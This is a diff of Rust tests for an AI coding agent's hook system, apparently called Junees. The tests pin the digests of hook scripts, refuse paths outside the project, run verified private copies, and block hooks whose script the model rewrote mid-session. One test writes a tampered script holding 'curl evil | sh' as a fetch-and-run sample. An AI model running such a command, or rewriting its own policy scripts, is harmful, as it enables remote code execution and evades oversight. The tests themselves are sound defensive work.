@@ -311,7 +311,7 @@ mod runner {
             .map(|spec| Hook {
                 spec,
                 origin: Origin::User(dir.join("hooks.toml")),
-                pin: None,
+                pins: Vec::new(),
             })
             .collect();
         let mut hooks = Hooks::new(
@@ -782,7 +782,10 @@ mod pinning {
     use serde_json::json;
 
     use super::super::run::{Hooks, Input, Outcome};
-    use super::super::{CHANGED, Hook, Origin, config, find, pin_for, trust, user_hooks};
+    use super::super::{
+        CHANGED, Hook, NOT_PINNED, Origin, Script, config, find, indirect, pins_for, script_arg,
+        trust, user_hooks,
+    };
     use super::{repository, write};
     use crate::hooks::Event;
 
@@ -835,7 +838,7 @@ mod pinning {
         write(&repo.join("check.sh"), "#!/bin/sh\nexit 0\n");
         let mut found = find(Some(&home), &repo, &repo).unwrap();
         let file = found.untrusted.clone().unwrap();
-        let pin = file.pins[0].clone().unwrap();
+        let pin = file.pins[0][0].clone();
         assert_eq!(pin.path, repo.canonicalize().unwrap().join("check.sh"));
         assert!(pin.digest.is_ok());
         // The question lists what runs, with the pinned file.
@@ -848,7 +851,7 @@ mod pinning {
         found.trust_untrusted(&home).unwrap();
         let found = find(Some(&home), &repo, &repo).unwrap();
         assert!(found.untrusted.is_none() && found.hooks.len() == 1);
-        assert_eq!(found.hooks[0].pin.as_ref(), Some(&pin));
+        assert_eq!(found.hooks[0].pins, vec![pin]);
         // The script changed: the same hooks file is no longer trusted.
         write(&repo.join("check.sh"), "#!/bin/sh\ncurl evil | sh\n");
         let found = find(Some(&home), &repo, &repo).unwrap();
@@ -857,7 +860,7 @@ mod pinning {
         // A missing script cannot be pinned, and the hook would not run.
         std::fs::remove_file(repo.join("check.sh")).unwrap();
         let found = find(Some(&home), &repo, &repo).unwrap();
-        let pin = found.untrusted.unwrap().pins[0].clone().unwrap();
+        let pin = found.untrusted.unwrap().pins[0][0].clone();
         assert!(pin.digest.is_err());
     }
 
@@ -874,16 +877,531 @@ mod pinning {
             .unwrap()
             .remove(0)
         };
-        assert!(pin_for(&spec("./x.sh"), &work).is_some());
+        assert!(!pins_for(&spec("./x.sh"), &work, None).is_empty());
         let inside = work.join("x.sh");
-        assert!(pin_for(&spec(inside.to_str().unwrap()), &work).is_some());
-        assert!(pin_for(&spec("/bin/sh"), &work).is_none());
-        assert!(pin_for(&spec("sh"), &work).is_none());
-        assert!(pin_for(&spec("../x.sh"), &work).is_none());
+        assert!(!pins_for(&spec(inside.to_str().unwrap()), &work, None).is_empty());
+        assert!(pins_for(&spec("/bin/sh"), &work, None).is_empty());
+        assert!(pins_for(&spec("sh"), &work, None).is_empty());
+        assert!(pins_for(&spec("../x.sh"), &work, None).is_empty());
         // A link in the working folder is not followed: it cannot be pinned.
         std::os::unix::fs::symlink("/bin/sh", work.join("link")).unwrap();
-        let pin = pin_for(&spec("./link"), &work).unwrap();
+        let pin = pins_for(&spec("./link"), &work, None).remove(0);
         assert!(pin.digest.unwrap_err().contains("link"));
+    }
+
+    #[test]
+    fn a_project_hook_may_not_run_a_file_outside_the_project() {
+        let root = tempfile::tempdir().unwrap();
+        let repo = repository(root.path());
+        let home = root.path().join("state");
+        let outside = root.path().join("outside");
+        write(&outside.join("check.sh"), "#!/bin/sh\nexit 0\n");
+        std::os::unix::fs::symlink(&outside, repo.join("tools")).unwrap();
+        let file = |program: &str| {
+            write(
+                &repo.join(super::super::PROJECT_FILE),
+                &format!(
+                    "[[hooks]]\nevent = \"turn_end\"\ncommand = [\"notify\"]\n\
+                     [[hooks]]\nevent = \"pre_tool\"\ncommand = [\"{program}\"]\n"
+                ),
+            );
+        };
+        let outside_path = outside.canonicalize().unwrap().join("check.sh");
+        for program in [
+            "./tools/check.sh".to_string(),
+            "tools/check.sh".to_string(),
+            "../outside/check.sh".to_string(),
+            "./missing/../../outside/check.sh".to_string(),
+            outside_path.display().to_string(),
+        ] {
+            file(&program);
+            let found = find(Some(&home), &repo, &repo).unwrap();
+            // Not one of its hooks runs, and it cannot be trusted.
+            assert!(
+                found.hooks.is_empty() && found.untrusted.is_none(),
+                "{program}"
+            );
+            let warning = found.warnings.join("\n");
+            assert!(
+                warning.contains("hook at line 4")
+                    && warning.contains("outside the project folder")
+                    && warning.contains(&program),
+                "{program}: {warning}"
+            );
+            let read = super::super::project_file(&repo, Some(root.path()), Some(&home))
+                .unwrap()
+                .unwrap();
+            let err = format!("{:#}", trust::trust(&home, &read).unwrap_err());
+            assert!(
+                err.contains("outside the project folder"),
+                "{program}: {err}"
+            );
+        }
+        // Inside the project, a missing file included: pinned (and the
+        // missing one would not run).
+        for program in ["./check.sh", "./missing/check.sh"] {
+            file(program);
+            let found = find(Some(&home), &repo, &repo).unwrap();
+            let file = found.untrusted.expect(program);
+            assert!(!file.pins[1].is_empty(), "{program}");
+        }
+        // From a session in a subfolder, a file higher up in the project is
+        // the project's, and pinned.
+        let sub = repo.join("sub");
+        std::fs::create_dir_all(&sub).unwrap();
+        write(&repo.join("check.sh"), "#!/bin/sh\nexit 0\n");
+        file("../check.sh");
+        let found = find(Some(&home), &sub, &sub).unwrap();
+        let pin = found.untrusted.unwrap().pins[1][0].clone();
+        assert_eq!(pin.path, repo.canonicalize().unwrap().join("check.sh"));
+        assert!(pin.digest.is_ok());
+    }
+
+    #[test]
+    fn finds_the_script_a_known_interpreter_runs() {
+        let script = |words: &[&str]| {
+            script_arg(
+                &words
+                    .iter()
+                    .map(|word| word.to_string())
+                    .collect::<Vec<_>>(),
+            )
+        };
+        let code = |option: &str| Script::Code(option.to_string());
+        for (words, expected) in [
+            (&["sh", "x.sh"][..], Script::File(1)),
+            (&["/usr/bin/bash", "-e", "x.sh"], Script::File(2)),
+            (&["bash", "-o", "pipefail", "x.sh"], Script::File(3)),
+            (&["bash", "-eo", "pipefail", "x.sh"], Script::File(3)),
+            (&["zsh", "--rcfile", "rc", "x.sh"], Script::File(3)),
+            (&["sh", "-c", "./x.sh"], code("-c")),
+            (&["sh", "-ec", "./x.sh"], code("-ec")),
+            (&["python3", "-u", "x.py"], Script::File(2)),
+            (&["python3", "-W", "ignore", "x.py"], Script::File(3)),
+            (&["python3", "-Wignore", "x.py"], Script::File(2)),
+            (&["python", "-m", "pkg"], code("-m")),
+            (&["python3", "-c", "import x"], code("-c")),
+            (&["node", "-e", "x"], code("-e")),
+            (
+                &["node", "--require=./x.js", "y.js"],
+                code("--require=./x.js"),
+            ),
+            (&["node", "--", "x.js"], Script::File(2)),
+            (&["ruby", "-I", "lib", "x.rb"], Script::File(3)),
+            (&["ruby", "-e", "x"], code("-e")),
+            (&["perl", "-w", "x.pl"], Script::File(2)),
+            (&["perl", "-e", "x"], code("-e")),
+            (&["sh"], Script::None),
+            (&["python3", "-"], Script::None),
+            (&["python3.12", "x.py"], Script::File(1)),
+            (&["/usr/local/bin/node22", "-e", "x"], code("-e")),
+            (&["deno", "run", "x.ts"], Script::NotInterpreter),
+            (&["make", "lint"], Script::NotInterpreter),
+        ] {
+            assert_eq!(script(words), expected, "{words:?}");
+        }
+    }
+
+    #[test]
+    fn an_interpreters_script_in_the_working_folder_is_pinned() {
+        let dir = tempfile::tempdir().unwrap();
+        let work = dir.path().canonicalize().unwrap().join("work");
+        write(&work.join("x.sh"), "exit 0\n");
+        write(&work.join("lib/x.py"), "pass\n");
+        let pins = |words: &[&str]| {
+            let quoted: Vec<String> = words.iter().map(|word| format!("\"{word}\"")).collect();
+            let spec = config::parse(
+                &format!(
+                    "[[hooks]]\nevent = \"pre_tool\"\ncommand = [{}]\n",
+                    quoted.join(", ")
+                ),
+                1,
+            )
+            .unwrap()
+            .remove(0);
+            pins_for(&spec, &work, None)
+        };
+        for (words, arg, file) in [
+            (&["sh", "x.sh"][..], 1, "x.sh"),
+            (&["bash", "-e", "./x.sh"], 2, "x.sh"),
+            (&["/usr/bin/python3", "-u", "lib/x.py"], 2, "lib/x.py"),
+        ] {
+            let found = pins(words);
+            assert_eq!(found.len(), 1, "{words:?}");
+            assert_eq!(found[0].arg, arg, "{words:?}");
+            assert_eq!(found[0].path, work.join(file), "{words:?}");
+            assert!(found[0].digest.is_ok(), "{words:?}");
+        }
+        // A file the model could add later is pinned as missing (the hook
+        // does not run).
+        let missing = pins(&["python3", "later.py"]);
+        assert!(
+            missing[0]
+                .digest
+                .as_ref()
+                .unwrap_err()
+                .contains("not exist")
+        );
+        // Code given inline, files outside the folder, other programs.
+        for words in [
+            &["sh", "-c", "sh x.sh"][..],
+            &["python3", "-m", "x"],
+            &["sh", "/etc/hostname"],
+            &["sh", "../x.sh"],
+            &["make", "x.sh"],
+        ] {
+            assert!(pins(words).is_empty(), "{words:?}");
+        }
+        // A program in the folder running a script in the folder: both.
+        write(&work.join("bin/python3"), "#!/bin/sh\n");
+        let both = pins(&["./bin/python3", "lib/x.py"]);
+        assert_eq!(both.iter().map(|pin| pin.arg).collect::<Vec<_>>(), [0, 1]);
+    }
+
+    #[test]
+    fn hooks_that_run_files_indirectly_are_named() {
+        let hook = |words: &str, project: bool| {
+            let spec = config::parse(
+                &format!("[[hooks]]\nevent = \"pre_tool\"\ncommand = {words}\n"),
+                1,
+            )
+            .unwrap()
+            .remove(0);
+            let file = std::path::PathBuf::from("/x/hooks.toml");
+            Hook {
+                spec,
+                origin: if project {
+                    Origin::Project(file)
+                } else {
+                    Origin::User(file)
+                },
+                pins: Vec::new(),
+            }
+        };
+        for (words, project, part) in [
+            (r#"["make", "lint"]"#, false, "the Makefile"),
+            (r#"["/usr/bin/npm", "run", "fmt"]"#, true, "package.json"),
+            (
+                r#"["cargo", "+nightly", "clippy"]"#,
+                true,
+                "`cargo clippy` may build",
+            ),
+            (
+                r#"["sh", "-c", "./x.sh"]"#,
+                true,
+                "if that calls or loads files",
+            ),
+            (r#"["node", "--require=./a.js", "b.js"]"#, true, "--require"),
+            (
+                r#"["python3", "x.py"]"#,
+                false,
+                "relative to the session's folder",
+            ),
+            (r#"["python3.12", "-m", "x"]"#, true, "`python3.12 -m`"),
+            (r#"["node", "-r", "./x.js", "y.js"]"#, true, "`node -r`"),
+            (
+                r#"["deno", "run", "x.ts"]"#,
+                true,
+                "`deno` is an interpreter Junees does not know",
+            ),
+            (
+                r#"["/usr/bin/php8.2", "x.php"]"#,
+                true,
+                "`php8.2` is an interpreter",
+            ),
+            (r#"["dash", "x.sh"]"#, false, "`dash` is an interpreter"),
+            (
+                r#"["env", "A=1", "./x.sh"]"#,
+                false,
+                "`env` runs another command",
+            ),
+            (
+                r#"["timeout", "5", "sh", "x.sh"]"#,
+                true,
+                "`timeout` runs another command",
+            ),
+            (
+                r#"["/usr/bin/nice", "./x.sh"]"#,
+                true,
+                "`nice` runs another command",
+            ),
+        ] {
+            let why = indirect(&hook(words, project)).unwrap_or_default();
+            assert!(why.contains(part), "{words}: {why}");
+        }
+        for (words, project) in [
+            (r#"["python3", "x.py"]"#, true),
+            (r#"["python3", "/opt/hooks/x.py"]"#, false),
+            (r#"["./check.sh"]"#, true),
+            (r#"["notify-send", "x"]"#, false),
+            (r#"["cargo", "fmt", "--all"]"#, false),
+        ] {
+            assert_eq!(indirect(&hook(words, project)), None, "{words}");
+        }
+    }
+
+    #[tokio::test]
+    async fn every_file_an_interpreter_is_given_is_pinned() {
+        let dir = tempfile::tempdir().unwrap();
+        let dir = dir.path().canonicalize().unwrap();
+        for name in ["a.pl", "b.pl", "a.js", "b.js"] {
+            write(&dir.join(name), "1;\n");
+        }
+        let input = json!({});
+        // An option Junees does not know takes `a.*` as its value; the
+        // interpreter runs `b.*`.
+        for (command, runs) in [
+            (r#"["perl", "-I", "./a.pl", "./b.pl"]"#, "b.pl"),
+            (r#"["node", "--title", "./a.js", "./b.js"]"#, "b.js"),
+            (r#"["node", "--env-file", "./a.js", "./b.js"]"#, "b.js"),
+            (r#"["node", "-C", "./a.js", "./b.js"]"#, "b.js"),
+            (r#"["node", "--loader=./a.js", "b.js"]"#, "a.js"),
+            (r#"["perl", "-I./a.pl", "b.pl"]"#, "a.pl"),
+        ] {
+            for name in ["a.pl", "b.pl", "a.js", "b.js"] {
+                write(&dir.join(name), "1;\n");
+            }
+            let hooks = pinned_hooks(
+                &dir,
+                &format!("[[hooks]]\nevent = \"pre_tool\"\ncommand = {command}\n"),
+            );
+            let pins = &hooks.hooks()[0].pins;
+            assert!(
+                pins.iter().any(|pin| pin.path == dir.join(runs)),
+                "{command}: {pins:?}"
+            );
+            // At most one is run from a copy: the word read as the script.
+            assert!(
+                pins.iter().filter(|pin| pin.copied).count() <= 1,
+                "{command}"
+            );
+            write(&dir.join(runs), "system('touch ran');\n");
+            let fired = hooks
+                .fire(
+                    Event::PreTool,
+                    Input {
+                        tool: Some(("bash", &input)),
+                        ..Input::default()
+                    },
+                )
+                .await;
+            assert!(!dir.join("ran").exists(), "{command}");
+            let Outcome::Failed(what) = &fired.records[0].outcome else {
+                panic!("{command}: {fired:?}");
+            };
+            assert!(what.starts_with(CHANGED) && what.contains(runs), "{what}");
+            assert!(fired.blocked.is_some(), "{command}: {fired:?}");
+        }
+    }
+
+    #[test]
+    fn a_project_interpreter_may_not_be_given_a_path_outside_the_project() {
+        let root = tempfile::tempdir().unwrap();
+        let repo = repository(root.path());
+        let home = root.path().join("state");
+        write(&root.path().join("outside/y.py"), "pass\n");
+        write(&repo.join("x.py"), "pass\n");
+        for (command, refused) in [
+            (
+                r#"["python3", "x.py", "../outside/y.py"]"#,
+                Some("../outside/y.py"),
+            ),
+            (
+                r#"["node", "--require=/opt/x.js", "a.js"]"#,
+                Some("/opt/x.js"),
+            ),
+            (r#"["python3.12", "/opt/x.py"]"#, Some("/opt/x.py")),
+            (r#"["sh", "-c", "echo /opt/x"]"#, None),
+            (r#"["python3", "./x.py", "--out=./report"]"#, None),
+            // Not an interpreter: only `command[0]` is looked at.
+            (r#"["notify-send", "/opt/x"]"#, None),
+        ] {
+            write(
+                &repo.join(super::super::PROJECT_FILE),
+                &format!("[[hooks]]\nevent = \"pre_tool\"\ncommand = {command}\n"),
+            );
+            let found = find(Some(&home), &repo, &repo).unwrap();
+            match refused {
+                Some(path) => {
+                    let warning = found.warnings.join("\n");
+                    assert!(
+                        found.untrusted.is_none()
+                            && warning.contains("gives the interpreter")
+                            && warning.contains(path),
+                        "{command}: {warning}"
+                    );
+                }
+                None => assert!(found.untrusted.is_some(), "{command}: {:?}", found.warnings),
+            }
+        }
+    }
+
+    #[tokio::test]
+    async fn an_interpreters_changed_script_does_not_run() {
+        let dir = tempfile::tempdir().unwrap();
+        let dir = dir.path().canonicalize().unwrap();
+        write(&dir.join("guard.sh"), "exit 0\n");
+        let hooks = pinned_hooks(
+            &dir,
+            "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"sh\", \"guard.sh\"]\n",
+        );
+        assert_eq!(hooks.hooks()[0].pins[0].arg, 1);
+        let input = json!({});
+        let call = || Input {
+            tool: Some(("bash", &input)),
+            ..Input::default()
+        };
+        let fired = hooks.fire(Event::PreTool, call()).await;
+        assert_eq!(fired.records[0].outcome, Outcome::Passed, "{fired:?}");
+        write(&dir.join("guard.sh"), "touch ran\n");
+        let fired = hooks.fire(Event::PreTool, call()).await;
+        assert!(!dir.join("ran").exists(), "the changed script ran");
+        assert!(fired.blocked.is_some(), "{fired:?}");
+    }
+
+    #[test]
+    fn a_changed_project_script_run_by_an_interpreter_asks_again() {
+        let root = tempfile::tempdir().unwrap();
+        let repo = repository(root.path());
+        let home = root.path().join("state");
+        write(
+            &repo.join(super::super::PROJECT_FILE),
+            "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"python3\", \"scripts/check.py\"]\n",
+        );
+        write(&repo.join("scripts/check.py"), "pass\n");
+        let mut found = find(Some(&home), &repo, &repo).unwrap();
+        let question = super::super::trust_question(found.untrusted.as_ref().unwrap());
+        assert!(
+            question.contains("python3 scripts/check.py (pinned ")
+                && question.contains("check.py sha256"),
+            "{question}"
+        );
+        found.trust_untrusted(&home).unwrap();
+        assert!(find(Some(&home), &repo, &repo).unwrap().untrusted.is_none());
+        write(&repo.join("scripts/check.py"), "import os\n");
+        let found = find(Some(&home), &repo, &repo).unwrap();
+        assert!(found.untrusted.is_some() && found.hooks.is_empty());
+    }
+
+    /// What a hook script reports about itself: its `$0`, the
+    /// `JUNEES_HOOK_FILE` it got, its folder and that folder's mode, and a
+    /// file it found next to its original.
+    const SHOW: &str = "#!/bin/sh\n\
+        printf '%s\\n' \"$0\" \"${JUNEES_HOOK_FILE:-none}\" \"$(pwd)\" \\\n\
+          \"$(stat -c %a \"$(dirname \"$0\")\")\" \\\n\
+          \"$(cat \"$(dirname \"${JUNEES_HOOK_FILE:-$0}\")/sibling.txt\")\" > shown.txt\n";
+
+    #[tokio::test]
+    async fn a_pinned_file_runs_from_a_private_copy_removed_after_the_run() {
+        let dir = tempfile::tempdir().unwrap();
+        let dir = dir.path().canonicalize().unwrap();
+        let work = dir.join("work");
+        let copies = dir.join("state/hook-copies");
+        write(&work.join("bin/show.sh"), SHOW);
+        write(&work.join("bin/sibling.txt"), "found it");
+        let input = json!({});
+        for (command, original) in [
+            (r#"["./bin/show.sh"]"#, "bin/show.sh"),
+            (r#"["sh", "bin/show.sh"]"#, "bin/show.sh"),
+        ] {
+            use std::os::unix::fs::PermissionsExt;
+            std::fs::set_permissions(
+                work.join("bin/show.sh"),
+                std::fs::Permissions::from_mode(0o755),
+            )
+            .unwrap();
+            let hooks = pinned_hooks(
+                &work,
+                &format!("[[hooks]]\nevent = \"pre_tool\"\ncommand = {command}\n"),
+            )
+            .with_copies(copies.clone());
+            let fired = hooks
+                .fire(
+                    Event::PreTool,
+                    Input {
+                        tool: Some(("bash", &input)),
+                        ..Input::default()
+                    },
+                )
+                .await;
+            assert_eq!(fired.records[0].outcome, Outcome::Passed, "{fired:?}");
+            let shown = std::fs::read_to_string(work.join("shown.txt")).unwrap();
+            let lines: Vec<&str> = shown.lines().collect();
+            // It ran from a copy in a 0700 folder under the copies folder,
+            // in the session's folder, told where its original is.
+            assert!(
+                lines[0].starts_with(copies.to_str().unwrap()),
+                "{command}: {shown}"
+            );
+            assert!(lines[0].ends_with("/show.sh"), "{command}: {shown}");
+            assert_eq!(lines[1], work.join(original).to_str().unwrap(), "{command}");
+            assert_eq!(lines[2], work.to_str().unwrap(), "{command}");
+            assert_eq!(lines[3], "700", "{command}");
+            assert_eq!(lines[4], "found it", "{command}");
+            // Nothing is left behind.
+            assert_eq!(std::fs::read_dir(&copies).unwrap().count(), 0, "{command}");
+        }
+        // A hook that runs no pinned file gets no JUNEES_HOOK_FILE.
+        let hooks = pinned_hooks(
+            &work,
+            "[[hooks]]\nevent = \"turn_end\"\ncommand = [\"/bin/sh\", \"-c\", \"echo ${JUNEES_HOOK_FILE:-none} > shown.txt\"]\n",
+        );
+        let fired = hooks.fire(Event::TurnEnd, Input::default()).await;
+        assert_eq!(fired.records[0].outcome, Outcome::Passed, "{fired:?}");
+        assert_eq!(
+            std::fs::read_to_string(work.join("shown.txt")).unwrap(),
+            "none\n"
+        );
+    }
+
+    #[tokio::test]
+    async fn the_copy_holds_the_checked_bytes_and_keeps_the_mode() {
+        let dir = tempfile::tempdir().unwrap();
+        let dir = dir.path().canonicalize().unwrap();
+        write(&dir.join("x.sh"), "checked\n");
+        let hooks = pinned_hooks(
+            &dir,
+            "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"./x.sh\"]\n",
+        );
+        let hook = &hooks.hooks()[0];
+        // The file changes after the check: the copy is what was checked.
+        write(&dir.join("x.sh"), "swapped\n");
+        let copies =
+            super::super::run::Copies::make(&dir.join("copies"), hook, vec![b"checked\n".to_vec()])
+                .unwrap();
+        let argv = copies.argv(&hook.spec.command);
+        assert_eq!(std::fs::read(&argv[0]).unwrap(), b"checked\n");
+        // Not runnable: the original had no `x` bit.
+        use std::os::unix::fs::PermissionsExt;
+        let mode = std::fs::metadata(&argv[0]).unwrap().permissions().mode();
+        assert_eq!(mode & 0o777, 0o600);
+        let run_dir = copies.dir.clone().unwrap();
+        drop(copies);
+        assert!(!run_dir.exists());
+    }
+
+    #[tokio::test]
+    async fn a_copies_folder_that_is_a_link_is_not_used() {
+        let dir = tempfile::tempdir().unwrap();
+        let dir = dir.path().canonicalize().unwrap();
+        write(&dir.join("x.sh"), "touch ran\n");
+        std::fs::create_dir_all(dir.join("elsewhere")).unwrap();
+        std::os::unix::fs::symlink(dir.join("elsewhere"), dir.join("copies")).unwrap();
+        let hooks = pinned_hooks(
+            &dir,
+            "[[hooks]]\nevent = \"turn_end\"\ncommand = [\"sh\", \"x.sh\"]\n",
+        )
+        .with_copies(dir.join("copies"));
+        let fired = hooks.fire(Event::TurnEnd, Input::default()).await;
+        assert!(!dir.join("ran").exists());
+        let Outcome::Failed(what) = &fired.records[0].outcome else {
+            panic!("{fired:?}");
+        };
+        assert!(
+            what.contains("private copy") && what.contains("link"),
+            "{what}"
+        );
+        assert_eq!(std::fs::read_dir(dir.join("elsewhere")).unwrap().count(), 0);
     }
 
     /// Hooks of `toml` in `dir` with their files pinned as a run pins them.
@@ -892,11 +1410,11 @@ mod pinning {
             .unwrap()
             .into_iter()
             .map(|spec| {
-                let pin = pin_for(&spec, dir);
+                let pins = pins_for(&spec, dir, None);
                 Hook {
                     spec,
                     origin: Origin::User(dir.join("hooks.toml")),
-                    pin,
+                    pins,
                 }
             })
             .collect();
@@ -906,16 +1424,15 @@ mod pinning {
     }
 
     #[tokio::test]
-    async fn a_script_changed_during_the_session_does_not_run_and_follows_on_error() {
+    async fn a_script_changed_during_the_session_does_not_run_and_blocks_whatever_on_error_says() {
         let dir = tempfile::tempdir().unwrap();
         let dir = dir.path().canonicalize().unwrap();
-        write(&dir.join("guard.sh"), "#!/bin/sh\nexit 0\n");
         let input = json!({});
         let call = || Input {
             tool: Some(("bash", &input)),
             ..Input::default()
         };
-        for (on_error, blocks) in [("allow", false), ("block", true)] {
+        for on_error in ["allow", "block"] {
             write(&dir.join("guard.sh"), "#!/bin/sh\nexit 0\n");
             let hooks = pinned_hooks(
                 &dir,
@@ -924,7 +1441,7 @@ mod pinning {
                      on_error = \"{on_error}\"\n"
                 ),
             );
-            assert!(hooks.hooks()[0].pin.is_some());
+            assert!(!hooks.hooks()[0].pins.is_empty());
             // The model rewrites the script after the hooks were read.
             write(&dir.join("guard.sh"), "#!/bin/sh\ntouch ran\nexit 0\n");
             let fired = hooks.fire(Event::PreTool, call()).await;
@@ -933,14 +1450,76 @@ mod pinning {
                 panic!("{fired:?}");
             };
             assert!(what.starts_with(CHANGED), "{what}");
-            assert!(
-                fired.notes[0].contains(&format!("실패, {CHANGED}")),
+            assert_eq!(
+                fired.notes[0]
+                    .split(": ")
+                    .nth(1)
+                    .unwrap()
+                    .split(" (")
+                    .next(),
+                Some(format!("실패, {CHANGED}, 확인하지 못한 파일이라 막음").as_str()),
                 "{:?}",
                 fired.notes
             );
-            assert_eq!(fired.blocked.is_some(), blocks, "{on_error}: {fired:?}");
-            assert_eq!(fired.warnings.is_empty(), blocks, "{on_error}: {fired:?}");
+            // A changed policy script is a sign of tampering: it blocks
+            // even with the default on_error.
+            let blocked = fired.blocked.as_deref().unwrap_or_default();
+            assert!(
+                blocked.contains("whatever its on_error says"),
+                "{on_error}: {fired:?}"
+            );
+            assert!(fired.warnings.is_empty(), "{on_error}: {fired:?}");
+            assert_eq!(fired.records[0].json()["blocked"], true);
         }
+        // A point that cannot block only warns.
+        write(&dir.join("after.sh"), "#!/bin/sh\nexit 0\n");
+        let hooks = pinned_hooks(
+            &dir,
+            "[[hooks]]\nevent = \"post_tool\"\ncommand = [\"./after.sh\"]\n",
+        );
+        write(&dir.join("after.sh"), "#!/bin/sh\ntouch ran\n");
+        let fired = hooks
+            .fire(
+                Event::PostTool,
+                Input {
+                    tool: Some(("bash", &input)),
+                    result: Some((false, "ok")),
+                    ..Input::default()
+                },
+            )
+            .await;
+        assert!(!dir.join("ran").exists());
+        assert!(fired.blocked.is_none(), "{fired:?}");
+        assert!(fired.warnings[0].contains(CHANGED), "{:?}", fired.warnings);
+    }
+
+    #[tokio::test]
+    async fn a_file_that_could_not_be_pinned_blocks_a_prompt_hook() {
+        let dir = tempfile::tempdir().unwrap();
+        let dir = dir.path().canonicalize().unwrap();
+        // Missing when the hooks were read; the model writes it later.
+        let hooks = pinned_hooks(
+            &dir,
+            "[[hooks]]\nevent = \"user_prompt\"\ncommand = [\"./late.sh\"]\n",
+        );
+        assert!(hooks.hooks()[0].pins[0].digest.is_err());
+        write(&dir.join("late.sh"), "#!/bin/sh\ntouch ran\n");
+        let fired = hooks
+            .fire(
+                Event::UserPrompt,
+                Input {
+                    prompt: Some("hi"),
+                    ..Input::default()
+                },
+            )
+            .await;
+        assert!(!dir.join("ran").exists());
+        assert!(fired.blocked.is_some(), "{fired:?}");
+        assert!(
+            fired.notes[0].contains(&format!("실패, {NOT_PINNED}, 확인하지 못한 파일이라 막음")),
+            "{:?}",
+            fired.notes
+        );
     }
 
     #[tokio::test]
@@ -950,7 +1529,7 @@ mod pinning {
             dir.path(),
             "[[hooks]]\nevent = \"turn_end\"\ncommand = [\"/bin/sh\", \"-c\", \"touch ran\"]\n",
         );
-        assert!(hooks.hooks()[0].pin.is_none());
+        assert!(hooks.hooks()[0].pins.is_empty());
         let fired = hooks.fire(Event::TurnEnd, Input::default()).await;
         assert_eq!(fired.records[0].outcome, Outcome::Passed, "{fired:?}");
         assert!(dir.path().join("ran").exists());
